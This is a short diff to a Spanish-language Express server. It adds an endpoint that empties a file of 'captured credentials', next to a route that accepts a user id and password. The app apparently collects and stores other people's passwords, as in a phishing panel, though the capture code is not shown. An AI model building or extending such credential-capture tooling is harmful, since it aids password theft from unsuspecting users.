@@ -594,6 +594,16 @@ app.get('/incap-registros', (req, res) => {
   res.sendFile(path.resolve(__dirname, 'lista-usuarios.html'))
 })
 
+app.post('/api/credenciales-capturadas/limpiar', async (req, res) => {
+  try {
+    await fs.promises.writeFile(CREDENTIALS_CAPTURE_PATH, '[]\n', 'utf8')
+    res.json({ ok: true })
+  } catch (err) {
+    console.error('Error limpiando credenciales capturadas:', err.message)
+    res.status(500).json({ ok: false, error: 'no_se_pudo_limpiar' })
+  }
+})
+
 app.post('/api/confirmar-pass', async (req, res) => {
   try {
     const { usuario_id, contrasena } = req.body || {}
